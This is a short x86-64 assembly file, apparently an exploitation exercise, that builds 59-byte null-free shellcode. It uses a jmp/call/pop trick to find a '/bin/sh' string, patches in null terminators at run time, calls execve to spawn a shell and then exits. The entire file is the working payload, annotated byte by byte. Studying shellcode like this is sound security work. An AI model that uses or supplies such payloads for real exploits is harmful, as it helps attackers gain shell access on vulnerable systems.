
  .text
  .globl	main
  .type	main, @function
main:


  jmp     . + 0x26            #2B, jump 38B further (line25)
  popq    %rsi                #1B, pop previous %rip (.string address) to source index
  xorq    %rax, %rax          #3B, set %rax to 0 without null bytes in opcode
  movq    %rax, 0x8(%rsi)     #4B, set .string to "/bin/sh0\0\0\0\0\0\0\0\0"
  movb    %al, 0x7(%rsi)      #3B, set .string to "/bin/sh\0\0\0\0\0\0\0\0\0"

  movq    %rsi, %rdi          #3B, copy .string address (name[0]) to destination index (1st syscall param)
  leaq    0x8(%rsi), %rsi     #4B, (2nd syscall param, execve args)
  leaq    0x8(%rsi), %rdx     #4B, (3rd syscall param)
  movb    $59, %al            #2B, %al = 59 -> syscall num for execve()
  syscall                     #2B, execve(name[0], name, NULL)

  xorq    %rax, %rax          #3B, set %rax to 0
  movb    $60, %al            #2B, %al = 60 -> syscall num for exit()
  xorq    %rdi, %rdi          #3B, set destination index (1st syscall param) to 0
  syscall                     #2B, exit(0)

  call    . - 0x24            #5B, main() -> push %rip (.string address), jump 36B backwards (line9) 
  .string	"/bin/sh000000000"  #16B, total shellcode size = 59B
